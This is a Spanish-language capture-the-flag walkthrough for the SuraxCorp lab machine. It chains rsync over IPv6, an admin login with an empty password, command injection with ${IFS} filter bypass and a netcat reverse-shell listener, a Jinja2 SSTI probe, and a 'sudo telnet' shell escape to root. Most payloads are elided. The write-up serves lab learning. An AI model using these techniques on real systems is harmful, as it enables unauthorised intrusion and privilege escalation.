---
tags: [ctf, thehackerslabs, linux, walkthrough]
tipo: walkthrough
estado: resuelto
---

# SuraxCorp — Walkthrough

> [!note] Cómo leer esta nota
> **comando → salida relevante → interpretación → por qué**. Salidas *(reconstrucción)* del roadmap de estudio.

## Paso 1 — Rsync por IPv6

**Comando**
```bash
nmap -6 -p- --open -sS <IPv6-objetivo>
rsync -av --list-only rsync://[<IPv6>]:873/
rsync -av --list-only rsync://[<IPv6>]:873/backup/
rsync -av rsync://[<IPv6>]:873/backup/ ./backup/
```

**Interpretación / por qué**
- Rsync puede escuchar **solo en IPv6**; hay que escanear/usar `-6` o direcciones `[IPv6]`.
- El módulo `backup` expone un **archivo de configuración de virtual host** → pista directa.

## Paso 2 — Vhost y login administrativo

**Comando**
```bash
echo "192.168.56.x secure-suraxcorp.thl" | sudo tee -a /etc/hosts
curl -s http://secure-suraxcorp.thl/
```

**Interpretación / por qué**
- El login administrativo acepta **contraseña vacía** → acceso trivial que suele pasar desapercibido.

## Paso 3 — `.deb` → inspección → vhost vulnerable

**Comando**
```bash
curl -sO http://secure-suraxcorp.thl/surapharm.deb
dpkg-deb -e surapharm.deb ./DEBIAN
dpkg-deb -x surapharm.deb ./data
# revisar scripts postinst/prerm y binarios
```

**Interpretación / por qué**
- El paquete contiene referencias al host `adminis-surapharm.suraxcorp.thl` y código con **command injection**.

## Paso 4 — Command injection

**Comando**
```bash
echo "192.168.56.x adminis-surapharm.suraxcorp.thl" | sudo tee -a /etc/hosts
# bypass de filtros con ${IFS} y wildcards
curl -s 'http://adminis-surapharm.suraxcorp.thl/?cmd=...' 
# reverse shell
nc -nlvp 4444
```

**Interpretación / por qué**
- Con filtros activos se usan `wildcards`, `${IFS}` y operadores (`;`, `|`) para lograr RCE → shell `www-data`.

## Paso 5 — Enumeración local → Flask `:5000`

**Comando**
```bash
ss -tlnp
curl -s http://127.0.0.1:5000/
```

**Interpretación / por qué**
- Servicio Flask **interno** (`127.0.0.1:5000`) no expuesto al exterior: hay que enumerar localhost.

## Paso 6 — SSTI vía `/surax` → `/event`

**Comando**
```bash
curl -s http://127.0.0.1:5000/surax           # habilita la ruta
curl -s -X POST http://127.0.0.1:5000/event --data 'description={{7*7}}'
# confirmado 49 -> escalar a RCE Jinja2
```

**Interpretación / por qué**
- `/event` procesa `description` con `Template(description)`: **SSTI**. El **traceback de Werkzeug** revela el sink exacto.
- Explotar Jinja2 para ejecutar comandos como `suraxddq`.

## Paso 7 — `sudo telnet` → root

**Comando**
```bash
sudo -l
sudo telnet
# dentro de telnet:
!/bin/sh
id
```

**Interpretación / por qué**
- `telnet` permite invocar comando (`!`) → escape a shell con los privilegios del `sudo` → root.

## Qué funcionó

- Escanear **IPv6** para Rsync.
- Inspeccionar el `.deb` en lugar de tratarlo como caja negra.
- Confirmar el **sink** (`Template(description)`) antes de explotar la SSTI.

## Qué falló (y por qué)

- Payloads de command injection con caracteres bloqueados; hubo que usar `${IFS}` y wildcards.

## Qué aprendí

- Rsync/IPv6 como superficie olvidada.
- Encadenar **command injection → SSTI**.
- Cambiar **una sola variable** por prueba para no perder el hilo.
